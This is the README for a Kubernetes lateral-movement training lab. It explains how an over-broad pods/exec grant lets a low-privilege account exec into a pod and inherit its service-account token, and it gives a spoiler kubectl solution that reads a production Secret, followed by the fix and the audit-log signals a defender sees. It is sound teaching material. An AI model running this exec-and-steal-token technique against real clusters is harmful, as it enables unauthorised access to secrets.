# pod-exec - lateral movement via pods/exec (RBAC)

An RBAC lateral-movement lab in the nested-cluster shape. The student lands in a
`dev`-namespace shell whose service account holds only `pods/exec` in the `ops`
namespace, and must read a Secret in `production` by execing into a pod that runs
as a more privileged identity.

## Shape

Everything is in the module's manifest bundle
(`services/backend/internal/labs/modules/pod-exec.yaml`), applied into the
session's disposable nested k3s cluster. Two pods, both the shared
`k8labs-foothold` image - no per-module image. The flag is bait, not a secret
(see `_template`).

## The flaw

The foothold's service account (`dev/sa-exec`) is granted `pods/exec` (create on
the `pods/exec` subresource) plus `get`/`list` on pods in `ops`. A pod there,
`ci-runner`, runs as `ops/ci`, which is legitimately bound to read secrets in
`production`. `exec` drops the caller *inside* the target pod, where ci's
service-account token is mounted - so the foothold inherits ci's identity and
reads what ci can read. The foothold itself has no read grant anywhere.

## Solution (spoiler)

```sh
kubectl auth can-i --list -n ops                # spot: pods/exec in ops (bare --list checks dev, shows nothing)
kubectl get pods -n ops                          # find: ci-runner
kubectl exec -it ci-runner -n ops -- sh          # now you are ci
# inside the pod, kubectl uses ci's mounted token automatically:
kubectl get secret flag -n production -o jsonpath='{.data.flag}' | base64 -d
# k8labs{pods_exec_inherits_the_targets_service_account}
```

## The fix

Scope `pods/exec` to the specific pods a role must debug (`resourceNames`), or
do not grant it - it is identity access, not read access. Defence in depth:
`automountServiceAccountToken: false` on workloads that never call the API means
a reachable pod still hands over no token.

## What a defender sees

The API server records an `exec` as a `create` on the `pods/exec` subresource in
the audit log, followed by API calls from inside the pod using the target's
token. The signal is a `dev`-namespace identity opening an exec stream into an
`ops` pod. Under Kata in prod, host-level Tetragon cannot see inside the nested
cluster, so this is an audit-log / in-cluster-telemetry observation - the same
design note as `ns-escape`.
